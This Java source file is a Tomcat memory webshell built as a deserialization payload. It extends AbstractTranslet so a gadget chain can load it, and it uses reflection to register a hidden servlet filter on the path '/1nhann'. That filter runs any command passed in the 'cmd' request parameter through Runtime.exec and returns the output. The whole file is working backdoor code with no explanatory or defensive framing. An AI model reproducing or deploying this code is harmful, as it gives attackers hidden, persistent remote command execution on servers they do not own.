import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;

public class FilterShell2 extends AbstractTranslet implements Serializable, Filter {
    public FilterShell2() throws Exception{
        namesArray = new String[]{"fuck"};
    }
    static {
        try {
            StandardContext context = (StandardContext) ((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources().getContext();

            Filter filter = new FilterShell2();

            String name = "1nhann";

            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(name);
            filterDef.setFilter(filter);


            Constructor applicationFilterConfig = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class,FilterDef.class});
            applicationFilterConfig.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfig.newInstance(new Object[]{context,filterDef});


            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(name);
            filterMap.addURLPattern("/1nhann");


            Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>)getFieldValue(context,"filterConfigs");
            filterConfigs.put(name,filterConfig);
            context.addFilterDef(filterDef);
            context.addFilterMapBefore(filterMap);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpServletRequest request = (HttpServletRequest) servletRequest;

        Runtime rt = Runtime.getRuntime();
        String cmd = request.getParameter("cmd");
        Process process = rt.exec(cmd);
        java.io.InputStream in = process.getInputStream();
        PrintWriter writer = response.getWriter();
        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
        String s = null;
        while ((s = stdInput.readLine()) != null) {
            writer.println(s);
        }
        writer.flush();
        writer.close();
    }
}
